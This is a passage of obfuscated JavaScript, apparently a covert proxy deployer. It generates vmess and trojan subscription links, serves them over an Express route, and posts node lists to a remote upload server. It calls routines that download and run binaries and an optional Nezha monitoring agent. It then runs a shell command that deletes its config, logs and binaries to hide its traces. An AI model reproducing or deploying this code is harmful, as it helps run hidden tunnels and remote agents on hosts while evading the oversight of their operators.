axios[_0xa9748a(0x244)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3a9412['data']&&_0x3a9412[_0xa9748a(0x1ee)][_0xa9748a(0x1f2)]==='success'&&_0x3a9412[_0xa9748a(_0x5bf819._0x300a38)][_0xa9748a(_0x5bf819._0x1a9ba9)]&&_0x3a9412[_0xa9748a(_0x5bf819._0x3cd230)][_0xa9748a(0x1be)])return _0x3a9412[_0xa9748a(0x1ee)][_0xa9748a(0x229)]+'_'+_0x3a9412[_0xa9748a(_0x5bf819._0xe349e6)][_0xa9748a(_0x5bf819._0x52a802)];}catch(_0x5b4cf5){}}return _0xa9748a(_0x5bf819._0x35d549);}async function _0x42577b(_0x39672b){const _0x5d603c={_0x17d4e1:0x239,_0x1aa2cf:0x258,_0x3b7a30:0x212,_0x3e5de0:0x1e4,_0x266d78:0x1ac,_0x18129f:0x1f5,_0x54963d:0x221,_0x6bf909:0x226,_0x11501e:0x1a9,_0x32241e:0x215,_0x1bc4db:0x244},_0x2bb2e9=await _0x22f27a(),_0x98d429=NAME?NAME+'-'+_0x2bb2e9:_0x2bb2e9;return new Promise(_0x5afd7a=>{const _0x391ef2={_0x20e52d:0x221};setTimeout(()=>{const _0x5d4f29=_0x3905,_0x3e86bd={'v':'2','ps':''+_0x98d429,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5d4f29(_0x5d603c._0x17d4e1),'host':_0x39672b,'path':_0x5d4f29(_0x5d603c._0x1aa2cf),'tls':'tls','sni':_0x39672b,'alpn':'','fp':_0x5d4f29(0x208)},_0x32bb94=_0x5d4f29(0x1dc)+UUID+'@'+CFIP+':'+CFPORT+_0x5d4f29(0x21f)+_0x39672b+_0x5d4f29(_0x5d603c._0x3b7a30)+_0x39672b+_0x5d4f29(0x230)+_0x98d429+_0x5d4f29(0x1d4)+Buffer[_0x5d4f29(0x1f5)](JSON['stringify'](_0x3e86bd))['toString'](_0x5d4f29(0x226))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5d4f29(0x1da)+_0x39672b+_0x5d4f29(_0x5d603c._0x3b7a30)+_0x39672b+_0x5d4f29(_0x5d603c._0x3e5de0)+_0x98d429+_0x5d4f29(_0x5d603c._0x266d78);console['log'](Buffer[_0x5d4f29(_0x5d603c._0x18129f)](_0x32bb94)[_0x5d4f29(_0x5d603c._0x54963d)](_0x5d4f29(_0x5d603c._0x6bf909))),fs[_0x5d4f29(_0x5d603c._0x11501e)](subPath,Buffer[_0x5d4f29(0x1f5)](_0x32bb94)['toString'](_0x5d4f29(0x226))),console[_0x5d4f29(_0x5d603c._0x32241e)](FILE_PATH+_0x5d4f29(0x233)),uploadNodes(),app[_0x5d4f29(_0x5d603c._0x1bc4db)]('/'+SUB_PATH,(_0x2b1712,_0x1641d6)=>{const _0x36bad2=_0x5d4f29,_0x33a3ba=Buffer[_0x36bad2(0x1f5)](_0x32bb94)[_0x36bad2(_0x391ef2._0x20e52d)]('base64');_0x1641d6[_0x36bad2(0x23c)](_0x36bad2(0x216),_0x36bad2(0x23a)),_0x1641d6[_0x36bad2(0x1ed)](_0x33a3ba);}),_0x5afd7a(_0x32bb94);},0x7d0);});}}async function uploadNodes(){const _0x374597={_0x28cdc9:0x23e,_0x4bde17:0x215,_0x5b2d29:0x261,_0x243063:0x220,_0x4a80f2:0x1d1,_0x35f5b1:0x238,_0x29c6bb:0x23e,_0x15e07b:0x1a4},_0x2a399b=_0xe54b22;if(UPLOAD_URL&&PROJECT_URL){const _0x31c362=PROJECT_URL+'/'+SUB_PATH,_0x3dbe3e={'subscription':[_0x31c362]};try{const _0x259971=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x3dbe3e,{'headers':{'Content-Type':_0x2a399b(_0x374597._0x28cdc9)}});return _0x259971&&_0x259971['status']===0xc8?(console[_0x2a399b(_0x374597._0x4bde17)]('Subscription\x20uploaded\x20successfully'),_0x259971):null;}catch(_0x2638d1){if(_0x2638d1[_0x2a399b(0x1cb)]){if(_0x2638d1[_0x2a399b(0x1cb)][_0x2a399b(0x1f2)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2a399b(_0x374597._0x5b2d29)](listPath))return;const _0x350934=fs[_0x2a399b(0x1ef)](listPath,'utf-8'),_0x2d5ad3=_0x350934[_0x2a399b(0x213)]('\x0a')[_0x2a399b(_0x374597._0x243063)](_0x4e8835=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a399b(0x1ab)](_0x4e8835));if(_0x2d5ad3[_0x2a399b(_0x374597._0x4a80f2)]===0x0)return;const _0x501371=JSON[_0x2a399b(0x1db)]({'nodes':_0x2d5ad3});try{const _0xcb1cad=await axios[_0x2a399b(_0x374597._0x35f5b1)](UPLOAD_URL+'/api/add-nodes',_0x501371,{'headers':{'Content-Type':_0x2a399b(_0x374597._0x29c6bb)}});return _0xcb1cad&&_0xcb1cad[_0x2a399b(0x1f2)]===0xc8?(console['log'](_0x2a399b(_0x374597._0x15e07b)),_0xcb1cad):null;}catch(_0x239eee){return null;}}else return;}}function cleanFiles(){const _0x10708d={_0x28f359:0x24a,_0x509987:0x25f,_0x5e1671:0x23f},_0x8c8848={_0x50db0d:0x1fe,_0x26ffda:0x215};setTimeout(()=>{const _0xf799ca={_0x19ea4e:0x215},_0x129b97=_0x3905,_0x30f6d8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x30f6d8[_0x129b97(0x1fa)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x30f6d8['push'](phpPath);process[_0x129b97(_0x10708d._0x28f359)]===_0x129b97(0x237)?exec(_0x129b97(0x1b4)+_0x30f6d8[_0x129b97(0x25f)]('\x20')+_0x129b97(0x1bd),_0x1bba86=>{const _0x4a4d21=_0x129b97;console[_0x4a4d21(_0x8c8848._0x50db0d)](),console[_0x4a4d21(0x215)]('App\x20is\x20running'),console[_0x4a4d21(_0x8c8848._0x26ffda)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x129b97(0x259)+_0x30f6d8[_0x129b97(_0x10708d._0x509987)]('\x20')+_0x129b97(_0x10708d._0x5e1671),_0x3091de=>{const _0x73868=_0x129b97;console[_0x73868(0x1fe)](),console[_0x73868(_0xf799ca._0x19ea4e)](_0x73868(0x22a)),console[_0x73868(0x215)](_0x73868(0x1d2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x20c7cb={_0x299e47:0x215,_0xaae437:0x1f6,_0x14a282:0x238,_0x1108e6:0x1d6,_0x5bf73f:0x1c2,_0x274b78:0x1a5},_0x4866fd=_0xe54b22;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4866fd(_0x20c7cb._0x299e47)](_0x4866fd(_0x20c7cb._0xaae437));return;}try{const _0x1b196=await axios[_0x4866fd(_0x20c7cb._0x14a282)](_0x4866fd(_0x20c7cb._0x1108e6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4866fd(0x23e)}});return console['log'](_0x4866fd(_0x20c7cb._0x5bf73f)),_0x1b196;}catch(_0x557061){return console['error'](_0x4866fd(_0x20c7cb._0x274b78)+_0x557061[_0x4866fd(0x25c)]),null;}}async function startserver(){const _0x48f841={_0x4017cf:0x222},_0x10c1f9=_0xe54b22;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1e8bae){console[_0x10c1f9(_0x48f841._0x4017cf)](_0x10c1f9(0x21c),_0x1e8bae);}}startserver()[_0xe54b22(0x1c6)](_0x5ea871=>{const _0x5c8c58={_0xfc5504:0x222},_0x31bd06=_0xe54b22;console[_0x31bd06(_0x5c8c58._0xfc5504)](_0x31bd06(0x1aa),_0x5ea871);}),app['listen'](PORT,()=>console[_0xe54b22(0x215)](_0xe54b22(0x1c4)+PORT+'!'));
